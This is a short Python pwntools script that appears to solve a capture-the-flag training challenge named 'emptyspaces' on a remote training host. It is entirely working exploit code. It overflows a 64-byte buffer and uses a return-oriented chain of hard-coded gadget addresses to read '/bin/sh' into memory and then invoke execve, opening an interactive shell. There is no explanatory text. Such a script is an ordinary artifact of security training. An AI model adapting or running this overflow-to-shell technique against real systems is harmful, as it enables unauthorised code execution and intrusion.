from pwn import *
import time


context.terminal = ['tmux','splitw','-h']

#r = process("./emptyspaces")
r = remote("bin.training.jinblack.it", 4006)
#gdb.attach(r, gdbscript="""
 #  b *0x400c14
  #c
#""")
#input("wait")

r.recvuntil("What shall we use\nTo fill the empty spaces\nWhere we used to pwn?\n")

ptr_to_rax_xor_rax = 0x444b00
ptr_to_rax = 0x4155a4

ptr_to_rdi = 0x400696

ptr_to_rdx_rsi = 0x44bd59

ptr_to_buf = 0x6bb2e0
ptr_syscall = 0x474dc5
ptr_to_main = 0x400b95

bin_sh = "/bin/sh\0"
payload = b"A"*64 + p64(0x1) + p64(ptr_to_rax_xor_rax) + p64(ptr_to_rdi) + p64(0x0) + p64(ptr_to_rdx_rsi) + p64(len(bin_sh)) + p64(ptr_to_buf)  + p64(ptr_syscall) + p64(ptr_to_main)

r.send(payload)
time.sleep(1)

r.send(bin_sh)

time.sleep(1)
payload = b"A"*64 + p64(0x1) + p64(ptr_to_rax) + p64(0x3b) + p64(ptr_to_rdi) + p64(ptr_to_buf) + p64(ptr_to_rdx_rsi) + p64(0x0) + p64(0x0) + p64(ptr_syscall)

r.send(payload)



r.interactive()

